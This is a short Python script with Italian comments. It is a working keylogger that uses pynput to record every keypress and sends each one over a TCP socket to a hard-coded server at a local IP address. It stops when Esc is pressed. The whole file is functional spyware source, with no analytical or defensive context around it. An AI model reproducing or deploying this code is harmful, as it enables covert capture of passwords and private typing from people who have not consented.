from pynput import keyboard
import socket

# Configurazione del server
SERVER_IP = '192.168.1.190'
SERVER_PORT = 1235

def invia_al_server(dati):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))
        s.send(dati.encode('utf-8'))
        s.close()
    except Exception as e:
        print(f"Errore nell'invio dei dati al server: {e}")

def on_press(key):
    try:
        key_str = f"{key.char}"
    except AttributeError:
        key_str = f"{key}"
    
    # Invia il tasto al server
    invia_al_server(key_str)

def on_release(key):
    if key == keyboard.Key.esc:
        # Notifica il server e ferma il listener
        invia_al_server('Keylogger fermato')
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
